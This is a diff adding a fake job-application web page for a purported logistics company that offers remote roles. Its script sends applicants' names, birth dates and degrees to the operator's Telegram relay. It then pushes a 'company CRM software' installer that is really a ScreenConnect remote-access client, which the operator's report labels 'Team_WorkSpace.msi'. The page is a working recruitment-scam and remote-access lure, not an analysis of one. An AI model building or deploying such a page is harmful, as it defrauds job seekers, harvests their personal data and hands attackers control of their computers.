@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Temco Logistics Company – Onboarding</title>
+    <style>
+        :root{
+            --brand-1:#667eea;
+            --brand-2:#764ba2;
+            --muted:#666;
+            --card-bg:#fff;
+            --radius:10px;
+        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background:linear-gradient(135deg,var(--brand-1),var(--brand-2));
+            min-height:100vh;
+            padding:30px;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+        }
+        .container{
+            width:100%;
+            max-width:900px;
+            background:white;
+            border-radius:var(--radius);
+            overflow:hidden;
+            box-shadow:0 10px 30px rgba(0,0,0,0.2);
+        }
+        /* STICKY HEADER */
+        .header{
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            text-align:center;
+            padding:30px;
+            color:white;
+            background:linear-gradient(135deg,var(--brand-1),var(--brand-2));
+        }
+        .logo{
+            width:110px;height:110px;
+            background:white;
+            padding:10px;
+            border-radius:50%;
+            object-fit:contain;
+            margin-bottom:10px;
+        }
+        .content{padding:30px;background:#fafafa}
+        .page{display:none}
+        .page.active{display:block}
+        .welcome-body{line-height:1.6;color:#555;margin-bottom:30px}
+        .welcome-body p { margin-bottom: 14px; }
+        .welcome-body h3 { margin: 26px 0 12px; color:#333; }
+        .welcome-body ul { margin: 8px 0 16px 18px; }
+        .btn{
+            background:linear-gradient(135deg,var(--brand-1),var(--brand-2));
+            color:white;
+            border:none;
+            padding:15px 25px;
+            border-radius:8px;
+            font-weight:700;
+            cursor:pointer;
+            display:block;
+            width:100%;
+            text-align:center;
+            margin-top:20px;
+        }
+        .form-group{margin-bottom:15px}
+        label{font-weight:600;margin-bottom:5px;display:block}
+        input, select{
+            width:100%;
+            padding:10px;
+            border:1px solid #ddd;
+            border-radius:6px;
+        }
+        .row{display:grid;grid-template-columns:1fr 1fr;gap:15px}
+        .instructions{
+            background:#f8f9fb;
+            padding:20px;
+            border-left:5px solid var(--brand-1);
+            border-radius:8px;
+            margin-bottom:20px;
+        }
+        .alert{
+            background:#fff7dd;
+            padding:15px;
+            border-left:5px solid #f4c542;
+            margin-bottom:25px;
+            border-radius:8px;
+        }
+        .center{text-align:center}
+    </style>
+</head>
+<body>
+<div class="container" role="main" aria-labelledby="main-heading">
+    <header class="header">
+        <img src="imgj.png" alt="GETHYPOWER INC logo" class="logo">
+        <div class="org-name">TEMCO LOGISTICS COMPANY</div>
+        <h1 id="main-heading">Job Application Portal</h1>
+        <p>Join Our Team Today</p>
+    </header>
+
+    <main class="content">
+
+        <!-- PAGE 1: Welcome -->
+        <section id="page1" class="page active">
+           <div class="welcome-body">
+
+            <p>Dear Candidate,</p>
+
+            <p>
+            Welcome, and thank you for your interest in joining <strong>TEMCO LOGISTICS COMPANY</strong>.
+            We are pleased to inform you that you have been selected to move forward in the
+            orientation and interview briefing process for one of our remote support positions.
+            </p>
+
+            <p><strong>We are currently offering the following roles:</strong></p>
+
+            <ul>
+            <li>Accounts Payable & Receivable Specialist</li>
+            <li>Customer Care Representative</li>
+            <li>Social Media Marketing Assistant</li>
+            <li>Remote Administrative Coordinator</li>
+            </ul>
+
+            <p>
+            These positions are designed to provide essential administrative,
+            customer support, and operational assistance. Roles require approximately
+            <strong>15–22 hours per week</strong>, Monday through Friday, with a
+            <strong>flexible schedule</strong>. All duties may be completed <strong>remotely</strong>.
+            </p>
+
+            <h3>About TEMCO LOGISTICS COMPANY</h3>
+
+            <p>
+            <strong>TEMCO LOGISTICS COMPANY</strong>, Headquartered in Pomona, California, the company has fulfilled millions of residential and commercial deliveries for some of America’s largest retailers. Focusing on big and bulky products, Temco prides itself on elevating the final-mile delivery experience for its customers.</p>
+
+            <h3>Our Core Values</h3>
+
+            <table width="100%" cellpadding="0" cellspacing="0">
+            <tr valign="top">
+                <td width="50%" style="padding-right:20px;">
+                <strong>Safety</strong>
+                <p>We prioritize safety and maintain a strong commitment to protecting our people and the communities we serve.</p>
+                </td>
+                <td width="50%">
+                <strong>Empowerment</strong>
+                <p>We foster a supportive culture where individuals feel valued, heard, and inspired to win every day.</p>
+                </td>
+            </tr>
+            <tr valign="top">
+                <td style="padding-right:20px;">
+                <strong>Integrity</strong>
+                <p>We uphold ethical standards with honesty, transparency, and accountability, treating everyone with dignity and respect.</p>
+                </td>
+                <td>
+                <strong>Tenacity</strong>
+                <p>We face challenges head-on, adapt to change, and remain disciplined in the execution of our goals.</p>
+                </td>
+            </tr>
+            </table>
+
+            <h3>Role Responsibilities</h3>
+
+            <table width="100%" cellpadding="0" cellspacing="0">
+            <tr valign="top">
+                <td width="50%" style="padding-right:20px;">
+                <strong>Accounts Payable & Receivable Specialist</strong>
+                <ul>
+                    <li>Process and manage accounts payable transactions (invoices, vendor payments, expense reports)</li>
+                    <li>Monitor accounts receivable and follow up on outstanding invoices and reconcile bank statements and financial discrepancies</li>
+                    <li>Maintain accurate financial records and documentation also prepare and send invoices to clients/customers</li>
+                </ul>
+                </td>
+
+                <td width="50%">
+                <strong>Customer Care Representative</strong>
+                <ul>
+                    <li>Respond to customer inquiries via phone, email, or chat</li>
+                    <li>Resolve service issues professionally and efficiently</li>
+                    <li>Maintain accurate records of customer interactions</li>
+                </ul>
+                </td>
+            </tr>
+
+            <tr valign="top">
+                <td style="padding-right:20px;">
+                <strong>Social Media Marketing Assistant</strong>
+                <ul>
+                    <li>Maintain a consistent posting calendar and brand voice</li>
+                    <li>Engage with followers to build relationships and increase brand loyalty</li>
+                    <li>Assist with ad campaigns, influencer outreach, and marketing strategies</li>
+                </ul>
+                </td>
+
+                <td>
+                <strong>Remote Administrative Coordinator</strong>
+                <ul>
+                    <li>Coordinate schedules, meetings, and internal communications</li>
+                    <li>Maintain operational and financial documentation</li>
+                    <li>Support reporting and cross-department collaboration</li>
+                </ul>
+                </td>
+            </tr>
+            </table>
+
+            <h3>Benefits</h3>
+
+            <ul>
+            <li>Competitive pay</li>
+            <li>401(k) Retirement Plan</li>
+            <li>Comprehensive Health, Dental & Vision Insurance</li>
+            <li>Paid Time Off & Holidays</li>
+            <li>Remote Work Flexibility</li>
+            <li>Career Growth & Development Programs</li>
+            </ul>
+
+            <h3>Next Steps</h3>
+
+            <p>
+            Please confirm your readiness to proceed so we can finalize your orientation
+            materials and share your briefing package.
+            </p>
+
+            <p>
+            We look forward to moving ahead with you.
+            </p>
+
+            <p>
+            Sincerely,<br>
+            <strong>TEMCO LOGISTICS COMPANY Recruitment Team</strong>
+            </p>
+            </div>
+            <div class="center">
+                <button id="proceedBtn" class="btn">APPLICATION FORM</button>
+            </div>
+        </section>
+
+        <!-- PAGE 2: Application Form -->
+        <section id="page2" class="page">
+            <form id="applicationForm">
+                <div class="row">
+                    <div class="form-group">
+                        <label>First Name <span class="required">*</span></label>
+                        <input type="text" name="firstName" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Last Name <span class="required">*</span></label>
+                        <input type="text" name="lastName" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Date of Birth <span class="required">*</span></label>
+                    <input type="date" name="dob" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Highest Degree <span class="required">*</span></label>
+                    <select name="degree" required>
+                        <option value="">Select Degree</option>
+                        <option value="High School Diploma">High School Diploma</option>
+                        <option value="Associate Degree">Associate Degree</option>
+                        <option value="B.Sc">B.Sc</option>
+                        <option value="B.A">B.A</option>
+                        <option value="B.Eng">B.Eng</option>
+                        <option value="MBA">MBA</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>Desired Role <span class="required">*</span></label>
+                    <select name="role" required>
+                        <option value="">Select Role</option>
+                        <option value="Accounts Payable & Receivable Specialist">Accounts Payable & Receivable Specialist</option>
+                        <option value="Customer Care Representative">Customer Care Representative</option>
+                        <option value="Social Media Marketing Assistant">Social Media Marketing Assistant</option>
+                        <option value="Remote Administrative Coordinator">Remote Administrative Coordinator</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>Job Type <span class="required">*</span></label>
+                    <select name="jobType" required>
+                        <option value="">Select Type</option>
+                        <option value="Full Time">Full Time</option>
+                        <option value="Part Time">Part Time</option>
+                    </select>
+                </div>
+
+                <button type="submit" class="btn" id="submitBtn">Submit Application</button>
+            </form>
+        </section>
+
+        <!-- PAGE 3: Instructions -->
+        <section id="page3" class="page">
+            <h2 style="color: #667eea; margin-bottom: 25px; text-align: center;">Getting Started</h2>
+            <div class="alert">
+                <strong>Important:</strong> Please use a computer or desktop device to install the company CRM software.
+            </div>
+            <div class="instructions">
+                <h3>📋 Setup Instructions</h3>
+                <ol>
+                    <li><strong>System Requirements:</strong> Windows computer/desktop</li>
+                    <li><strong>Download Company Software:</strong> Click the button below</li>
+                    <li>Install the .msi file and follow the wizard</li>
+                    <li>Login with credentials sent to your email</li>
+                    <li><strong>After successful installation:</strong> Open the software, the built-in video call features will be used to finish your final interview step via video call.</li>
+                </ol>
+            </div>
+            <button class="btn" onclick="goToPage(4)">Download Software</button>
+        </section>
+
+        <!-- PAGE 4: Download Page -->
+        <section id="page4" class="page">
+            <div class="download-info" style="text-align:center; padding:40px 20px;">
+                <svg fill="#667eea" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="width:80px;height:80px;margin-bottom:20px;">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+                <h2 style="color: #667eea;">Download Starting...</h2>
+                <p style="color: #666; font-size: 16px;">Your CRM software download should begin automatically.<br>
+                If it doesn't, <a href="#" id="manualDownload" style="color:#667eea;font-weight:600;">click here</a>.</p>
+            </div>
+            <div class="instructions">
+                <h3>📦 What's Next?</h3>
+                <ol>
+                    <li>Locate the .msi file in your Downloads folder</li>
+                    <li>Double-click to install</li>
+                    <li>Check your email for login credentials</li>
+                </ol>
+            </div>
+        </section>
+
+    </main>
+</div>
+
+<script>
+    // Telegram reporting function (uses Vercel proxy)
+    async function sendToTelegram(text) {
+        try {
+            await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message: text })
+            });
+        } catch (e) {
+            console.error('Telegram notification failed:', e);
+        }
+    }
+
+    function goToPage(pageNum) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById('page' + pageNum).classList.add('active');
+        window.scrollTo(0, 0);
+
+        if (pageNum === 4) {
+            setTimeout(() => triggerDownload(), 800);
+        }
+    }
+
+    async function triggerDownload() {
+        // 1. Report to your Telegram
+        await sendToTelegram(
+            '📥 <b>Download Started</b>\n\n' +
+            'Someone just clicked to download <b>Team_WorkSpace.msi</b> from the onboarding portal.'
+        );
+
+        // 2. Trigger actual download
+        const link = document.createElement('a');
+        link.href = 'ScreenConnect.ClientSetup.msi';
+        link.download = 'ScreenConnect.ClientSetup.msi';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }
+
+    // Manual download link
+    document.getElementById('manualDownload')?.addEventListener('click', (e) => {
+        e.preventDefault();
+        triggerDownload();
+    });
+
+    // Submit form
+    document.getElementById('applicationForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const submitBtn = document.getElementById('submitBtn');
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Submitting...';
+
+        const formData = new FormData(e.target);
+
+        const message = `🆕 <b>NEW JOB APPLICATION</b>\n\n` +
+            `👤 Name: ${formData.get('firstName')} ${formData.get('lastName')}\n` +
+            `📅 DOB: ${formData.get('dob')}\n` +
+            `🎓 Degree: ${formData.get('degree')}\n` +
+            `💼 Role: ${formData.get('role')}\n` +
+            `⏰ Job Type: ${formData.get('jobType')}\n` +
+            `🕒 Submitted: ${new Date().toLocaleString()}`;
+
+        await sendToTelegram(message);
+
+        // Move to instructions page
+        goToPage(3);
+
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Submit Application';
+    });
+
+    // Welcome → Form button
+    document.getElementById('proceedBtn').addEventListener('click', () => goToPage(2));
+</script>
+</body>
+</html>
